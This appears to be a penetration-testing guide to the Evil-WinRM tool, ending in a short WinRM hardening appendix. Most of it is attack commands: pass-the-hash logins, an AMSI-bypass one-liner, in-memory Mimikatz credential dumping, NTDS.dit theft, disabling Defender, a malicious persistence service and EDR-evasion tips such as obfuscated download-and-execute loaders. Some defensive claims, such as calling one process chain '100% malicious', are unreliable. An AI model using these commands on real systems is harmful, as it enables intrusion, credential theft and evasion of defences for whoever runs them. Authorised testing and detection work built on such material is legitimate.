# Evil-WinRM-Guide

### Modern WinRM Client for Penetration Testing
**Beyond standard PowerShell: Pass-the-Hash, in-memory execution, and seamless file transfers.**

- **Target Audience:** Penetration Testers, Red Team Operators, Incident Responders
- **Last Updated:** January 15, 2026
- **Tested Against:** Evil-WinRM v3.7.0, Windows Server 2022, Kali Linux 2025.4, CrowdStrike Falcon, Microsoft Defender for Endpoint

---

## Table of Contents
1. [Architecture & Protocol](#1-architecture--protocol)
2. [Installation & Setup](#2-installation--setup)
3. [Connection Strategies](#3-connection-strategies)
4. [Advanced Features](#4-advanced-features)
5. [OPSEC & Detection](#5-opsec--detection)
6. [Rapid Reference Cheatsheet](#6-rapid-reference-cheatsheet)
7. [Appendix: WinRM Hardening Guide](#appendix-winrm-hardening-guide)

---

## 1. Architecture & Protocol

### The Protocol: WinRM 101
Windows Remote Management (WinRM) is Microsoft’s implementation of the WS-Management protocol, a SOAP-based API over HTTP/HTTPS for remote management.

| Feature | Detail |
| :--- | :--- |
| **Ports** | 5985 (HTTP), 5986 (HTTPS) |
| **Transport** | SOAP/XML over HTTP(S) |
| **Authentication** | NTLM, Kerberos, CredSSP, Certificate-Based |
| **Backend** | WinRM service -> WsmSvc -> WsmProvHost.exe (host process) |
| **Why Open?** | Required for SCCM, Ansible, Azure Automation, Intune; often exempt from firewall rules. |

> **Critical Insight (2025):** While RDP (3389) is frequently blocked, WinRM is often allowed on servers (especially IIS, SQL, domain controllers) because it is used by infrastructure tools.

### Why "Evil"? — Beyond Standard PowerShell
Standard `winrs` or `Invoke-Command` is limited and detectable. Evil-WinRM adds:

| Feature | Standard WinRM | Evil-WinRM |
| :--- | :--- | :--- |
| **Pass-the-Hash** | Only cleartext/Kerberos | `-H <NTLM>` (critical for lateral movement) |
| **AMSI Bypass** | None | Built-in Bypass-4MSI (memory patch) |
| **In-Memory Script Loading** | Must stage files | `-s ./scripts` -> Invoke-Mimikatz (no disk) |
| **File Transfer** | Manual Base64 | `upload`/`download` (WinRM-FS integrated) |
| **Persistence** | Manual service creation | Built-in services menu (no `sc.exe`) |
| **Logging** | Manual | `-l session.log` (auto-timestamped) |

> **Warning:** Evil-WinRM does not bypass EDR. It bypasses AMSI and ExecutionPolicy, but modern EDRs (CrowdStrike, SentinelOne) hook into `WsmProvHost.exe` directly.

### Dependencies
| Component | Version | Purpose |
| :--- | :--- | :--- |
| **Ruby** | >= 3.0 | Core runtime |
| **winrm gem** | >= 2.6 | WinRM protocol client |
| **winrm-fs gem** | >= 1.3 | File transfer over WinRM |
| **colorize gem** | >= 0.8 | Syntax highlighting |
| **stringio gem** | Standard | Session logging |

> **Pro Tip:** Use Docker to avoid Ruby gem conflicts.

---

## 2. Installation & Setup

### Gem Install (Legacy — Avoid)
```bash
# DO NOT RUN — breaks system Ruby
sudo gem install evil-winrm
```
*Problem:* Conflicts with Kali’s `ruby-winrm` package and breaks Ansible.

### Docker (2025 Preferred Method)
```bash
# Pull official image
docker pull ghcr.io/hackplayers/evil-winrm:latest

# Run with loot persistence
docker run -it --rm \
  -v $(pwd)/loot:/loot \
  -v ~/.evil-winrm:/root/.evil-winrm \
  --network host \
  ghcr.io/hackplayers/evil-winrm \
  -i 172.16.5.10 -u Administrator -H 'cc36cf78...'
```

**Benefits:**
- No Ruby dependency hell.
- Auto-updates with `docker pull`.
- Works on macOS/Linux/WSL2.

### Kali/BlackArch (Native Package)
```bash
# Kali 2024.4+ (recommended)
sudo apt update && sudo apt install evil-winrm

# BlackArch
sudo pacman -S evil-winrm
```

**Verification:**
```bash
evil-winrm --version
# Evil-WinRM v3.7.0 (Hackplayers)
```

---

## 3. Connection Strategies

| Auth Mode | Command | Context | OPSEC Rating |
| :--- | :--- | :--- | :--- |
| **Plaintext** | `evil-winrm -i 172.16.5.10 -u admin -p 'P@ssw0rd!'` | Initial foothold | 8/10 (Event ID 4624 + password in CLI) |
| **Pass-the-Hash** | `evil-winrm -i 172.16.5.10 -u admin -H 'cc36cf78...'` | Lateral movement gold | 6/10 (NTLMv2, no password) |
| **Kerberos** | `evil-winrm -i 172.16.5.10 -u admin -r corp.local` + `export KRB5CCNAME=admin.ccache` | Domain-joined hosts | 3/10 (native auth) |
| **HTTPS** | `evil-winrm -S -i 172.16.5.10 -u admin -p 'P@ss'` | Port 5986 (encrypted) | 5/10 (SNI leaks hostname) |
| **Client Cert** | `evil-winrm -S -i 172.16.5.10 -c cert.pem -k key.pem` | Azure VMs, PKI-hardened envs | 2/10 (silent) |
| **Logging** | `evil-winrm -i 172.16.5.10 -u admin -p 'P@ss' -l loot/172.16.5.10.log` | Professional reporting | N/A |

> **Pro Tip:** Combine `-H` + `-S` for encrypted Pass-the-Hash:
> ```bash
> evil-winrm -S -i 172.16.5.10 -u Administrator -H 'cc36cf78...' -l ~/loot/da.log
> ```

---

## 4. Advanced Features

*All commands run inside the Evil-WinRM shell.*
*Prompt: `Evil-WinRM* PS C:\Users\admin>`*

### File Transfer (WinRM-FS Integrated)
**upload / download Syntax**
```powershell
# Upload local -> remote
upload /opt/loot/mimikatz.exe C:\Windows\Tasks\m.exe

# Download remote -> local
download C:\Windows\NTDS\ntds.dit /loot/ntds.dit

# Whitespace Handling: QUOTE PATHS
upload './PowerView.ps1' 'C:\Program Files\Scripts\pv.ps1'
```
> **How It Works:** Uses WinRM-FS to chunk files over Create, Write, Close SOAP calls.

### In-Memory Script Loading (-s Flag)
**Concept**
Load `.ps1` scripts from a local directory and inject them into the remote PowerShell session without touching the disk.

**Setup**
```bash
# Local dir: ~/scripts/
# Contains: PowerView.ps1, Mimikatz.ps1, Seatbelt.ps1

evil-winrm -i 172.16.5.10 -u admin -H '...' -s ~/scripts
```

**Inside Shell**
```powershell
# Auto-loads all .ps1 files
Evil-WinRM* PS C:\> Get-Command -Module PowerView
# Invoke-UserHunter, Get-DomainUser, etc.

Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
# Runs in memory — no mimikatz.exe on disk
```
> **Why It Is Effective:**
> - No AV file scan triggers.
> - No `CreateFile` events.
> - AMSI bypass applied pre-execution.

### Bypasses (Built-In)
**AMSI Bypass**
```powershell
# One-liner (patched in memory)
Bypass-4MSI

# Verify
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Execution Policy**
Evil-WinRM auto-bypasses via:
```powershell
# Injected on every command
-ExecutionPolicy Bypass -Command "..."
```

> **Modern EDR Limitation:** CrowdStrike and SentinelOne hook `AmsiScanBuffer` directly, so `Bypass-4MSI` fails.
> **Workaround:** Use obfuscated loaders (e.g., `IEX (New-Object Net.WebClient).DownloadString(...)` with XOR).

### Service Creation (Persistence)
**Access Services Menu**
```powershell
# Type 'services' in shell
Evil-WinRM* PS C:\> services
[+] Services Menu:
1. List Services
2. Create Service
3. Start Service
4. Stop Service
5. Delete Service
Choose option: 2
```

**Create Malicious Service**
```text
Service Name: Updater
Binary Path: C:\Windows\Tasks\beacon.exe
Start Type: Auto
```
> **Result:**
> - `sc.exe create Updater binPath=...` (no `sc.exe` in process tree).
> - Service starts on reboot.
> - No `cmd.exe` child process.

---

## 5. OPSEC & Detection

### The "Noise" — Event Logs & Artifacts
| IOC | Event ID | Description |
| :--- | :--- | :--- |
| **Logon** | `4624` | Logon Type: 3 (Network), Authentication Package: NTLM/Kerberos. |
| **PowerShell** | `4104` | Script Block Logging — full decoded payload (AMSI bypass included). |
| **Process** | N/A | `WsmProvHost.exe` -> `powershell.exe` (parent-child). |
| **Network** | N/A | `POST /wsman HTTP/1.1`, Content-Type: `application/soap+xml`. |

> **Critical Indicator:** `WsmProvHost.exe` spawning `powershell.exe` is 100% malicious in modern environments. Legitimate WinRM uses `conhost.exe` directly.

### EDR Evasion — Reality Check (2025)
| EDR | Detection Capability | Workaround |
| :--- | :--- | :--- |
| **Microsoft Defender** | Blocks `Bypass-4MSI` via AMSI hook. | Use `IEX` + obfuscated base64. |
| **CrowdStrike Falcon** | Hooks `WsmProvHost.exe` and terminates PS. | Use `runas /netonly` + evil-winrm from low-priv host. |
| **SentinelOne** | Behavioral: WinRM -> PS -> Mimikatz. | Stage payloads via DNS tunneling + `IEX`. |

> **Best Practice:** Use Evil-WinRM for initial recon, then migrate to a C2 (Sliver/Cobalt Strike) for heavy lifting.

---

## 6. Rapid Reference Cheatsheet

| Task | Command |
| :--- | :--- |
| **Connect with Hash** | `evil-winrm -i 172.16.5.10 -u admin -H 'cc36cf78...'` |
| **Upload File** | `upload /opt/nc.exe 'C:\Windows\Tasks\nc.exe'` |
| **Load PowerSploit** | Launch with `-s ~/PowerSploit` -> `Invoke-Portscan -Targets 172.16.5.0/24` |
| **Bypass AMSI** | `Bypass-4MSI` (then verify with `amsiTest`) |
| **List Services** | Type `services` -> option 1 |
| **Download NTDS.dit** | `download C:\Windows\NTDS\ntds.dit ./loot/ntds.dit` |
| **Enable RDP** | `Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0` |
| **Disable Defender** | `Set-MpPreference -DisableRealtimeMonitoring $true` (requires admin) |
| **Run Binary from Memory** | `Invoke-Binary -Path ./mimikatz.exe -Arguments '"sekurlsa::logonpasswords"'` |
| **Exit Cleanly** | `exit` (sends DeleteShell SOAP call) |

---

## Appendix: WinRM Hardening Guide

### Mitigation Strategies
| Risk | Fix |
| :--- | :--- |
| **PtH Abuse** | Enable Restricted Admin Mode (`DisableRestrictedAdmin=0`). |
| **AMSI Bypass** | Enable Script Block Logging + AMSI Event Forwarding. |
| **WsmProvHost.exe Abuse** | Block `WsmProvHost.exe` -> `powershell.exe` via AppLocker. |
| **Default WinRM** | Disable WinRM on workstations; limit to servers via GPO. |

### Defender for Endpoint Query
```kusto
DeviceProcessEvents
| where InitiatingProcessFileName =~ "WsmProvHost.exe"
| where FileName =~ "powershell.exe"
| project Timestamp, DeviceName, ProcessCommandLine
```
